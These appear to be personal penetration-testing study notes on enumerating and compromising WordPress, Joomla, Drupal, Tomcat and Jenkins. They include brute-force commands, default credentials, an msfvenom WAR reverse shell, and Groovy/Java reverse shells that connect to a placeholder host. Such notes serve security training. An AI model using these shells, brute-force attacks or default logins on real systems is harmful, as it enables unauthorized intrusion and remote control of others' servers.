Navigation: [[Pentesting]]

---
# Table of Contents
1. Application Discovery
2. Content Management Systems
	1. WordPress
	2. Joomla
	3. Drupal
3. Containers and Software Dev
	1. Tomcat
	2. Jenkins
4. Infrastructure and Monitoring
5. Customer Service and Configuration Management
6. Common Gateway Interfaces
7. Thick Client
8. Misc.
# Application Discovery
**Eyewitness Scan**
Takes XML output from `nmap` and `Nessus` to create a report with screenshots of web apps using Selenium. It'll categorize, fingerprint, and suggest credentials based on application type.

It can also accept a list of IPs and URLs and be told to pre-pend `https://` and `http://` to the front of each.

Here's the [repo](https://github.com/FortyNorthSecurity/EyeWitness) for eyewitness.
```shell
eyewitness --web -x web_discovery.xml -d <output directory>
```

**Aquatone**
Similar to eyewitness, can take screenshots when provided a `.txt` of hosts or an `nmap` `.xml` file with the `-nmap` flag.

Here's the [repo](https://github.com/shelld3v/aquatone) for aquatone.
```shell
cat web_discovery.xml | ./aquatone -nmap
```
# Content Management Systems
For all CMS, when enumerating, run:
```shell
curl -s <site> | grep <CMS>
```
### WordPress
Commonly used CMS for blogs and forums. It's highly customizable, is written in PHP, and usually runs on Apache with MySQL as its backend.

**robots.txt**
```shell
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/
```

**User Types**

| User          | Description                                                                         |
| ------------- | ----------------------------------------------------------------------------------- |
| Administrator | Access to everything, including adding/deleting users/posts and editing source code |
| Editor        | Publish and manage posts, including posts of other users                            |
| Author        | Publish and manage their own posts                                                  |
| Contributor   | Can write and manage their own posts, unable to publish                             |
| Subscriber    | Can browse posts and edit their own profile                                         |

Enumeration Using [`WP Scan`](https://github.com/wpscanteam/wpscan):
```shell
sudo gem install wpscan
wpscan -h # help message
sudo wpscan --url <site> --enumerate --api-token <token>
```

We'll need an API token from [`WPVulnDB`](https://wpvulndb.com/), which is used by the scanner for reporting.

**Login Bruteforce**
Two options for `WPScan`, `xmlrpc` and `wp-login`. The former will use the API to make login attempts through `xmlrpc.php`, and is often preferred because it's faster. The latter uses the standard login page.
```shell
sudo wpscan --password-attack xmlrpc -t <threads> -U <user> -P <password list> --url <site>
```

**Finding Vulnerabilities**
Here's a breakdown of WordPress vulnerabilities by source:
- 4% from WordPress
- 89% from plugins
- 7% from themes

\*\* Note that we can use [`waybackurls`](https://github.com/tomnomnom/waybackurls) to look for older versions of a site. If the developers failed to remove the plugin correctly, we might still be able to access the directory it's stored in.
### Joomla
Common CMS used for discussion forums, e-Commerce, and others. Just like WordPress, it's written in PHP and uses MySQL as its backend. It also has many extensions and templates, with 2.5 million sites running Joomla.

**Standard robots.txt for Joomla**
```shell
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

**Enumeration**
The first tool we can use is [`JoomlaScan`](https://github.com/drego85/JoomlaScan), which requires `python2.7`:
```shell
sudo python2.7 -m pip install urllib3
sudo python2.7 -m pip install certifi
sudo python2.7 -m pip install bs4python2.7 joomlascan.py -u <site>
```

The second tool is [`droopescan`](https://github.com/droope/droopescan), which is a plugin based scanner:
```shell
sudo pip3 install droopescan
droopescan scan joomla --url <site>
```

**Brute Force**:
We can use [`jooma-bruteforce`](https://github.com/ajnik/joomla-bruteforce):
```shell
sudo python3 joomla-brute.py -u <site> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <user>
```
### Drupal
The last popular CMS we'll be looking at, popular among companies and developers, is Drupal. Once again written in PHP, but this time the backend can be MySQL, PostgreSQL, or even SQLite. It can have themes and modules like WordPress.

We can check version number using:
```shell
curl -s <site>.CHANGELOG.txt
```

[`droopescan`](https://github.com/droope/droopescan) from above works to enumerate a bit too:
```shell
droopescan scan drupal -u <site>
```
# Containers and Software Dev
The same `curl` enumeration from above applies here too
### Tomcat
Open source web server to host apps written in Java. Often not exposed to the internet, much more common in internal assessments. It'll usually be a high value target, with at least one instance being configured with weak or default credentials.

**General Folder Structure**:
```shell
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

The most important of the above is `WEB-INF/web.xml`, which contains deployment information such as routes and classes handling the routes. Any vulnerabilities in the `WEB-INF/classes` folder can lead to total compromise.

The `lib` folder stores JSP pages, which are similar to PHP files on an Apache server.

The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.

After we look through this, we should directory brute force. We can also try using weak credentials such as `tomcat:tomcat` or `admin:admin`.

**WAR File Upload**
The default management interface is available at `/manager/html`. Valid credentials allow us to upload a packaged .WAR file and compromise the app.

A WAR file can be created using a zip utility, and we'll need a JSP web shell. We can simply browse and deploy, then access the file in our browser to trigger the shell.

Generating a WAR file:
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<host> LPORT=<port> -f war > file.war
```
### Jenkins
Jenkins is a CI server that runs in servlet containers such as Tomcat. It has over 300 plugins and runs on Tomcat port 8080 by default. It also uses port 5000 to attach slave servers and communicate between master and slave.

It's able to use local databases, LDAP, Unix user database, delegate security to a servlet container, or use no authentication. Admins can also allow or disallow users from creating accounts.

By default, the database to store credentials doesn't allow users to register an account. We can access `/login` to recognize the server. The default admin creds are `admin:admin`

**Script Console**
The script console can be accessed at `/script`, allowing users to run Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts. Here's a way to run an arbitrary command:
```groovy
def cmd = '<command>'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Here's a quick one line reverse shell:
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

For Windows hosts:
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Java reverse shell
```groovy
String host="<IP>";
int port=<port>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


---
Navigation: [[Pentesting]]